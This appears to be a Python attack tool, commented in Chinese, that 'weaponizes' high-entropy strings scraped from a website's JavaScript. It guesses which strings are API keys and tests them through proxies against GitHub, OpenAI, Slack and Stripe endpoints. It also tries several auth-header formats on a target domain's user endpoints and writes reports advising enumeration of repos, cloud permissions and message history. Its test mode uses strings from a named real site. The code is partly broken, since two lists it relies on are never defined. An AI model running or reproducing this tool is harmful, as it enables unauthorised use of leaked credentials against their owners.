
import asyncio
import aiohttp
import json
import re
import time
import base64
import hashlib
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin
from hybrid_proxy_strategy import HybridHTTPClient

@dataclass
class EntropyString:
    """高熵字符串信息"""
    value: str
    entropy: float
    length: int
    source: str
    possible_types: List[str]
    confidence: float = 0.0
    
    def __post_init__(self):
        self.possible_types = self._analyze_string_type()
        self.confidence = self._calculate_confidence()
    
    def _analyze_string_type(self) -> List[str]:
        """分析字符串可能的类型"""
        types = []
        
        # API密钥模式识别
        if re.match(r'^sk-[a-zA-Z0-9]{20,}$', self.value):
            types.append('openai_api_key')
        elif re.match(r'^ghp_[a-zA-Z0-9]{36}$', self.value):
            types.append('github_token')
        elif re.match(r'^xoxb-[0-9]+-[0-9]+-[a-zA-Z0-9]+$', self.value):
            types.append('slack_bot_token')
        elif re.match(r'^xoxp-[0-9]+-[0-9]+-[a-zA-Z0-9]+$', self.value):
            types.append('slack_user_token')
        elif re.match(r'^AKIA[0-9A-Z]{16}$', self.value):
            types.append('aws_access_key')
        elif self.value.startswith('phc_'):
            types.append('posthog_key')
        elif self.value.startswith('pk_'):
            types.append('stripe_public_key')
        elif self.value.startswith('sk_'):
            types.append('stripe_secret_key')
        
        # 通用模式识别
        if len(self.value) >= 32 and re.match(r'^[a-fA-F0-9]+$', self.value):
            types.append('hex_hash')
        
        if len(self.value) >= 20 and re.match(r'^[A-Za-z0-9+/]+=*$', self.value):
            types.append('base64_encoded')
        
        if len(self.value) >= 40 and re.match(r'^[a-fA-F0-9]{40}$', self.value):
            types.append('sha1_hash')
        
        if len(self.value) == 64 and re.match(r'^[a-fA-F0-9]{64}$', self.value):
            types.append('sha256_hash')
        
        # JWT检测
        if self.value.count('.') == 2:
            parts = self.value.split('.')
            if all(re.match(r'^[A-Za-z0-9_-]+$', part) for part in parts):
                types.append('jwt_token')
        
        # 通用API密钥特征
        if len(self.value) >= 16:
            if re.match(r'^[A-Za-z0-9_-]+$', self.value):
                types.append('generic_api_key')
            if re.match(r'^[A-Za-z0-9]{32,}$', self.value):
                types.append('session_token')
        
        return types if types else ['unknown']
    
    def _calculate_confidence(self) -> float:
        """计算识别置信度"""
        confidence = 0.0
        
        # 基于长度的置信度
        if 16 <= len(self.value) <= 512:
            confidence += 0.2
        
        # 基于熵值的置信度
        if self.entropy >= 4.5:
            confidence += 0.3
        elif self.entropy >= 4.0:
            confidence += 0.2
        
        # 基于类型匹配的置信度
        known_types = [t for t in self.possible_types if t != 'unknown']
        if known_types:
            confidence += 0.4
            # 特殊类型加分
            if any(t in ['openai_api_key', 'github_token', 'aws_access_key'] for t in known_types):
                confidence += 0.1
        
        # 基于字符组成的置信度
        if re.match(r'^[A-Za-z0-9_-]+$', self.value):
            confidence += 0.1
        
        return min(1.0, confidence)

@dataclass
class WeaponizationResult:
    """武器化测试结果"""
    entropy_string: EntropyString
    test_results: List[Dict[str, Any]]
    successful_attacks: List[Dict[str, Any]]
    potential_value: str  # LOW, MEDIUM, HIGH, CRITICAL
    attack_vectors: List[str]
    recommendations: List[str]

class EntropyWeaponizer:
    """高熵字符串武器化器"""
    
    def __init__(self, proxy_file: str = "proxies.txt"):
        self.http_client = None
        self.proxy_file = proxy_file
        
        # 测试端点配置
        self.test_endpoints = {
            'github_token': [
                ('GET', 'https://api.github.com/user', {}),
                ('GET', 'https://api.github.com/user/repos', {}),
                ('GET', 'https://api.github.com/user/orgs', {})
            ],
            'openai_api_key': [
                ('GET', 'https://api.openai.com/v1/models', {}),
                ('POST', 'https://api.openai.com/v1/chat/completions', {
                    'model': 'gpt-3.5-turbo',
                    'messages': [{'role': 'user', 'content': 'test'}],
                    'max_tokens': 1
                })
            ],
            'slack_bot_token': [
                ('GET', 'https://slack.com/api/auth.test', {}),
                ('GET', 'https://slack.com/api/users.list', {})
            ],
            'stripe_secret_key': [
                ('GET', 'https://api.stripe.com/v1/account', {})
            ]
        }
        
        # HTTP认证头模式
        self.auth_patterns = {
            'bearer': 'Bearer {}',
            'basic': 'Basic {}',
            'api_key': 'ApiKey {}',
            'token': 'Token {}',
            'key': 'Key {}'
        }
        
        # 常见API参数名
        self.api_param_names = [
            'api_key', 'apikey', 'key', 'token', 'access_token',
            'auth_token', 'authorization', 'secret', 'password',
            'api_secret', 'client_secret', 'session_id', 'session_token'
        ]
    
    async def __aenter__(self):
        self.http_client = HybridHTTPClient(self.proxy_file)
        await self.http_client.__aenter__()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.http_client:
            await self.http_client.__aexit__(exc_type, exc_val, exc_tb)
    
    async def weaponize_entropy_strings(self, entropy_strings: List[EntropyString], target_domain: str = None) -> List[WeaponizationResult]:
        """武器化所有高熵字符串"""
        print(f"🎯 开始武器化 {len(entropy_strings)} 个高熵字符串...")
        
        results = []
        high_confidence_strings = [s for s in entropy_strings if s.confidence >= 0.5]
        
        print(f"🔍 高置信度字符串: {len(high_confidence_strings)}/{len(entropy_strings)}")
        
        # 按置信度排序，优先测试高置信度的
        sorted_strings = sorted(entropy_strings, key=lambda x: x.confidence, reverse=True)
        
        # 限制并发数，避免过载
        semaphore = asyncio.Semaphore(3)
        
        async def weaponize_single(entropy_string):
            async with semaphore:
                try:
                    result = await self._weaponize_single_string(entropy_string, target_domain)
                    return result
                except Exception as e:
                    print(f"❌ 武器化失败 ({entropy_string.value[:20]}...): {str(e)[:50]}...")
                    return None
        
        # 执行武器化
        tasks = [weaponize_single(s) for s in sorted_strings]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # 过滤有效结果
        valid_results = [r for r in results if isinstance(r, WeaponizationResult)]
        
        # 分析和报告
        self._analyze_weaponization_results(valid_results)
        
        return valid_results
    
    async def _weaponize_single_string(self, entropy_string: EntropyString, target_domain: str = None) -> WeaponizationResult:
        """武器化单个高熵字符串"""
        print(f"🔍 测试: {entropy_string.value[:30]}... (置信度: {entropy_string.confidence:.2f})")
        
        test_results = []
        successful_attacks = []
        attack_vectors = []
        
        # 基于类型的专门测试
        for string_type in entropy_string.possible_types:
            if string_type in self.test_endpoints:
                print(f"   🎯 专门测试: {string_type}")
                type_results = await self._test_specific_type(entropy_string, string_type)
                test_results.extend(type_results)
                
                # 检查成功的测试
                successful = [r for r in type_results if r.get('success', False)]
                successful_attacks.extend(successful)
                
                if successful:
                    attack_vectors.append(f"{string_type}_api")
        
        # 通用认证测试（如果没有特定类型匹配）
        if not successful_attacks:
            print(f"   🔄 通用认证测试...")
            generic_results = await self._test_generic_auth(entropy_string, target_domain)
            test_results.extend(generic_results)
            
            successful = [r for r in generic_results if r.get('success', False)]
            successful_attacks.extend(successful)
            
            if successful:
                attack_vectors.append('generic_auth')
        
        # JWT解码测试
        if 'jwt_token' in entropy_string.possible_types:
            jwt_result = self._analyze_jwt_token(entropy_string)
            if jwt_result:
                test_results.append(jwt_result)
                if jwt_result.get('sensitive_data'):
                    successful_attacks.append(jwt_result)
                    attack_vectors.append('jwt_decode')
        
        # Base64解码测试
        if 'base64_encoded' in entropy_string.possible_types:
            b64_result = self._analyze_base64_content(entropy_string)
            if b64_result:
                test_results.append(b64_result)
                if b64_result.get('contains_secrets'):
                    successful_attacks.append(b64_result)
                    attack_vectors.append('base64_decode')
        
        # 评估潜在价值
        potential_value = self._assess_potential_value(entropy_string, successful_attacks)
        
        # 生成建议
        recommendations = self._generate_recommendations(entropy_string, successful_attacks, attack_vectors)
        
        return WeaponizationResult(
            entropy_string=entropy_string,
            test_results=test_results,
            successful_attacks=successful_attacks,
            potential_value=potential_value,
            attack_vectors=attack_vectors,
            recommendations=recommendations
        )
    
    async def _test_specific_type(self, entropy_string: EntropyString, string_type: str) -> List[Dict[str, Any]]:
        """测试特定类型的API密钥"""
        results = []
        
        if string_type not in self.test_endpoints:
            return results
        
        for method, url, data in self.test_endpoints[string_type]:
            try:
                headers = self._build_auth_headers(entropy_string.value, string_type)
                
                start_time = time.time()
                
                if method == 'GET':
                    async with await self.http_client.get(url, headers=headers, params=data) as response:
                        result = await self._process_response(response, entropy_string, string_type, url, start_time)
                elif method == 'POST':
                    async with await self.http_client.post(url, headers=headers, json=data) as response:
                        result = await self._process_response(response, entropy_string, string_type, url, start_time)
                
                results.append(result)
                
                # 礼貌延迟
                await asyncio.sleep(0.5)
                
            except Exception as e:
                results.append({
                    'test_type': string_type,
                    'url': url,
                    'success': False,
                    'error': str(e),
                    'response_time': 0
                })
        
        return results
    
    async def _test_generic_auth(self, entropy_string: EntropyString, target_domain: str = None) -> List[Dict[str, Any]]:
        """通用认证测试"""
        results = []
        
        # 测试目标URL列表
        test_urls = []
        
        if target_domain:
            # 基于目标域名的常见端点
            base_urls = [
                f"https://{target_domain}",
                f"https://api.{target_domain}",
                f"https://www.{target_domain}"
            ]
            
            common_paths = [
                "/api/user", "/api/me", "/api/auth/user",
                "/api/v1/user", "/api/v2/user",
                "/user", "/profile", "/account",
                "/api/account", "/api/profile"
            ]
            
            for base_url in base_urls:
                for path in common_paths:
                    test_urls.append(urljoin(base_url, path))
        
        # 通用测试URL
        generic_urls = [
            "https://httpbin.org/bearer",
            "https://httpbin.org/basic-auth/user/passwd"
        ]
        
        test_urls.extend(generic_urls)
        
        # 限制测试URL数量
        test_urls = test_urls[:10]
        
        for url in test_urls:
            for auth_pattern_name, auth_pattern in self.auth_patterns.items():
                try:
                    headers = {'Authorization': auth_pattern.format(entropy_string.value)}
                    
                    start_time = time.time()
                    async with await self.http_client.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        result = await self._process_response(response, entropy_string, f"generic_{auth_pattern_name}", url, start_time)
                        results.append(result)
                    
                    # 短暂延迟
                    await asyncio.sleep(0.2)
                    
                except Exception as e:
                    # 静默处理错误，避免刷屏
                    continue
        
        return results
    
    async def _process_response(self, response: aiohttp.ClientResponse, entropy_string: EntropyString, 
                               test_type: str, url: str, start_time: float) -> Dict[str, Any]:
        """处理API响应"""
        response_time = time.time() - start_time
        
        result = {
            'test_type': test_type,
            'url': url,
            'status_code': response.status,
            'response_time': response_time,
            'success': False,
            'headers': dict(response.headers),
            'response_data': None
        }
        
        # 判断成功条件
        if response.status == 200:
            result['success'] = True
            try:
                content_type = response.headers.get('content-type', '')
                if 'application/json' in content_type:
                    data = await response.json()
                    result['response_data'] = data
                else:
                    text = await response.text()
                    result['response_data'] = text[:500]  # 限制长度
            except:
                result['response_data'] = "Unable to parse response"
        elif response.status == 401:
            result['auth_required'] = True
        elif response.status == 403:
            result['forbidden'] = True
            result['success'] = True  # 403也意味着认证生效了，只是权限不足
        
        return result
    
    def _build_auth_headers(self, token: str, string_type: str) -> Dict[str, str]:
        """构建认证头部"""
        headers = {'User-Agent': 'Security-Research/1.0'}
        
        if string_type == 'github_token':
            headers['Authorization'] = f'token {token}'
        elif string_type == 'openai_api_key':
            headers['Authorization'] = f'Bearer {token}'
        elif string_type == 'slack_bot_token' or string_type == 'slack_user_token':
            headers['Authorization'] = f'Bearer {token}'
        
        return headers
    
    def _analyze_jwt_token(self, entropy_string: EntropyString) -> Optional[Dict[str, Any]]:
        """分析JWT令牌"""
        try:
            parts = entropy_string.value.split('.')
            if len(parts) != 3:
                return None
            
            # 解码JWT头部和载荷
            header = self._base64_decode_jwt_part(parts[0])
            payload = self._base64_decode_jwt_part(parts[1])
            
            result = {
                'test_type': 'jwt_decode',
                'success': True,
                'header': header,
                'payload': payload,
                'sensitive_data': False
            }
            
            # 检查敏感信息
            sensitive_fields = ['email', 'user_id', 'username', 'role', 'permissions', 'scope']
            if payload:
                for field in sensitive_fields:
                    if field in payload:
                        result['sensitive_data'] = True
                        break
            
            return result
            
        except Exception as e:
            return {
                'test_type': 'jwt_decode',
                'success': False,
                'error': str(e)
            }
    
    def _base64_decode_jwt_part(self, part: str) -> Optional[Dict[str, Any]]:
        """解码JWT部分"""
        try:
            # JWT使用URL安全的base64编码，可能缺少填充
            padding = len(part) % 4
            if padding:
                part += '=' * (4 - padding)
            
            decoded = base64.urlsafe_b64decode(part)
            return json.loads(decoded.decode('utf-8'))
        except:
            return None
    
    def _analyze_base64_content(self, entropy_string: EntropyString) -> Optional[Dict[str, Any]]:
        """分析Base64编码内容"""
        try:
            decoded = base64.b64decode(entropy_string.value)
            decoded_str = decoded.decode('utf-8', errors='ignore')
            
            result = {
                'test_type': 'base64_decode',
                'success': True,
                'decoded_content': decoded_str[:200],  # 限制长度
                'contains_secrets': False
            }
            
            # 检查是否包含敏感信息
            secret_patterns = [
                r'password', r'secret', r'key', r'token', r'api',
                r'credentials', r'auth', r'login', r'session'
            ]
            
            for pattern in secret_patterns:
                if re.search(pattern, decoded_str, re.IGNORECASE):
                    result['contains_secrets'] = True
                    break
            
            return result
            
        except Exception as e:
            return {
                'test_type': 'base64_decode',
                'success': False,
                'error': str(e)
            }
    
    def _assess_potential_value(self, entropy_string: EntropyString, successful_attacks: List[Dict[str, Any]]) -> str:
        """评估潜在价值"""
        if not successful_attacks:
            return "LOW"
        
        for attack in successful_attacks:
            test_type = attack.get('test_type', '')
            if any(ct in test_type for ct in critical_types):
                return "CRITICAL"
            elif any(ht in test_type for ht in high_types):
                return "HIGH"
        
        # 基于成功攻击数量
        if len(successful_attacks) >= 3:
            return "HIGH"
        elif len(successful_attacks) >= 1:
            return "MEDIUM"
        
        return "LOW"
    
    def _generate_recommendations(self, entropy_string: EntropyString, successful_attacks: List[Dict[str, Any]], 
                                attack_vectors: List[str]) -> List[str]:
        """生成利用建议"""
        recommendations = []
        
        if not successful_attacks:
            recommendations.append("当前测试未发现可利用的攻击向量")
            recommendations.append("建议进行手动分析和更深入的测试")
            return recommendations
        
        for attack in successful_attacks:
            test_type = attack.get('test_type', '')
            
            if 'github' in test_type:
                recommendations.append("GitHub令牌有效 - 可访问代码仓库、私有项目")
                recommendations.append("建议枚举可访问的组织和仓库")
            elif 'aws' in test_type:
                recommendations.append("AWS访问密钥有效 - 可能访问云资源")
                recommendations.append("建议枚举IAM权限和可访问的服务")
            elif 'openai' in test_type:
                recommendations.append("OpenAI API密钥有效 - 可进行AI API调用")
                recommendations.append("注意API使用费用和rate限制")
            elif 'slack' in test_type:
                recommendations.append("Slack令牌有效 - 可访问工作空间数据")
                recommendations.append("建议枚举频道、用户和消息历史")
            elif 'stripe' in test_type:
                recommendations.append("Stripe密钥有效 - 可访问支付数据")
                recommendations.append("⚠️ 高度敏感 - 涉及财务信息")
        
        if 'jwt_decode' in attack_vectors:
            recommendations.append("JWT令牌已解码 - 检查载荷中的敏感信息")
        
        if 'base64_decode' in attack_vectors:
            recommendations.append("Base64内容已解码 - 发现潜在敏感数据")
        
        return recommendations
    
    def _analyze_weaponization_results(self, results: List[WeaponizationResult]):
        """分析武器化结果"""
        print("\n🎯 武器化结果分析:")
        
        total = len(results)
        successful = len([r for r in results if r.successful_attacks])
        critical = len([r for r in results if r.potential_value == "CRITICAL"])
        high = len([r for r in results if r.potential_value == "HIGH"])
        
        print(f"   📊 总字符串: {total}")
        print(f"   ✅ 成功武器化: {successful}")
        print(f"   🚨 严重威胁: {critical}")
        print(f"   ⚠️  高危威胁: {high}")
        
        # 显示关键发现
        critical_results = [r for r in results if r.potential_value == "CRITICAL"]
        for result in critical_results[:3]:  # 显示前3个关键发现
            print(f"\n🚨 关键发现: {result.entropy_string.value[:30]}...")
            for attack in result.successful_attacks[:2]:
                print(f"   - {attack.get('test_type')}: {attack.get('url', 'N/A')}")
    
    def export_weaponization_report(self, results: List[WeaponizationResult], output_file: str = None) -> str:
        """导出武器化报告"""
        if not output_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"entropy_weaponization_{timestamp}.json"
        
        export_data = {
            'analysis_time': datetime.now().isoformat(),
            'total_strings': len(results),
            'successful_weaponizations': len([r for r in results if r.successful_attacks]),
            'results': []
        }
        
        for result in results:
            result_data = {
                'entropy_string': {
                    'value': result.entropy_string.value,
                    'entropy': result.entropy_string.entropy,
                    'length': result.entropy_string.length,
                    'possible_types': result.entropy_string.possible_types,
                    'confidence': result.entropy_string.confidence
                },
                'potential_value': result.potential_value,
                'attack_vectors': result.attack_vectors,
                'successful_attacks_count': len(result.successful_attacks),
                'recommendations': result.recommendations,
                'test_results': result.test_results
            }
            export_data['results'].append(result_data)
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(export_data, f, indent=2, ensure_ascii=False, default=str)
        
        print(f"📄 武器化报告已导出: {output_file}")
        return output_file

async def auto_weaponize_from_js_mining(js_mining_result_file: str, target_domain: str = None) -> List[WeaponizationResult]:
    """从JS挖掘结果自动进行高熵字符串武器化"""
    print("🚀 自动高熵字符串武器化启动...")
    
    # 读取JS挖掘结果
    try:
        with open(js_mining_result_file, 'r', encoding='utf-8') as f:
            mining_data = json.load(f)
    except Exception as e:
        print(f"❌ 无法读取JS挖掘结果: {e}")
        return []
    
    # 提取高熵字符串
    entropy_strings = []
    high_entropy_data = mining_data.get('high_entropy_strings', [])
    
    for item in high_entropy_data:
        entropy_string = EntropyString(
            value=item.get('string', ''),
            entropy=item.get('entropy', 0.0),
            length=item.get('length', 0),
            source=item.get('source', 'js_mining')
        )
        entropy_strings.append(entropy_string)
    
    if not entropy_strings:
        print("⚠️  未发现高熵字符串")
        return []
    
    print(f"🎯 发现 {len(entropy_strings)} 个高熵字符串")
    
    # 执行武器化
    async with EntropyWeaponizer() as weaponizer:
        results = await weaponizer.weaponize_entropy_strings(entropy_strings, target_domain)
        
        # 导出报告
        weaponizer.export_weaponization_report(results)
        
        return results

# 测试函数
async def test_entropy_weaponizer():
    """测试高熵字符串武器化器"""
    print("🧪 高熵字符串武器化器测试")
    print("=" * 50)
    
    # 真实高熵字符串（从biograph.com提取）
    test_strings = [
        EntropyString("ChEI8KisxAYQvc/pzLmcmvvSARIlADkapmD2YZtgaVduElEzw6Ha3iFHOp+AWFO7vxJOTsq3K2zTORoCRPs=", 5.38, 84, "biograph.com", []),
        EntropyString("ChEI8KisxAYQvc/pzLmcmvvSARIlADkapmBtQJciUiTmsp3MdWCDft67b1rpTFirUY8ClTvDcqvXRBoCHbQ=", 5.29, 84, "biograph.com", []),
        EntropyString("Q1VTVE9NO0FwZXJjdSBQcm8gTGlnaHQ=", 4.73, 32, "biograph.com", []),
        EntropyString("eyIwIjoiTEEiLCIxIjoiTEEtVlQiLCIyIjpmYWxzZSwiMyI6Imdvb2dsZS5sYSIsIjQiOiIiLCI1Ijp0cnVlLCI2IjpmYWxzZSwiNyI6ImFkX3N0b3JhZ2V8YW5hbHl0aWNzX3N0b3JhZ2V8YWRfdXNlcl9kYXRhfGFkX3BlcnNvbmFsaXphdGlvbiJ9", 5.38, 188, "biograph.com", []),
        EntropyString("Q1VTVE9NO0FwZXJjdSBQcm8gUmVndWxhcg==", 4.70, 36, "biograph.com", [])
    ]
    
    async with EntropyWeaponizer() as weaponizer:
        results = await weaponizer.weaponize_entropy_strings(test_strings)
        weaponizer.export_weaponization_report(results)

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1:
        # 自动武器化模式
        mining_file = sys.argv[1]
        target_domain = sys.argv[2] if len(sys.argv) > 2 else None
        asyncio.run(auto_weaponize_from_js_mining(mining_file, target_domain))
    else:
        # 测试模式
        asyncio.run(test_entropy_weaponizer()) 